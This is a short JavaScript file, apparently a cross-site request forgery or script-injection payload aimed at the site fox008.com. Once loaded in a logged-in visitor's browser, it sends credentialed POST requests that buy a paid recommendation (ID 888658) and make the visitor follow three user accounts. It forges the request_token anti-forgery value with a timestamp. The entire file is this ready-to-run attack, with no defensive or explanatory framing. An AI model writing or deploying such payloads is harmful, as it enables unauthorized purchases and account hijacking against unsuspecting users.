function url_buy(recommendId)
{
 return "http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime())+"&recommendId="+recommendId+"&request_token="+String(new Date().getTime());
}
function url_follow(userid)
{
	return "http://www.fox008.com/user/follow?t="+String(new Date().getTime())+"&userId="+userid+"&type=&request_token="+String(new Date().getTime());
}
function post_data(url)
{
	var xmlhttp;
	if (window.XMLHttpRequest)
  	{// code for IE7+, Firefox, Chrome, Opera, Safari
  		xmlhttp=new XMLHttpRequest();
  	}
	else
  	{// code for IE6, IE5
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  	}
	xmlhttp.withCredentials = true;
	xmlhttp.open("POST",url,true);
	xmlhttp.send(null);
}
post_data(url_buy("888658"));
post_data(url_follow("137536"));
post_data(url_follow("140665"));
post_data(url_follow("176940"));
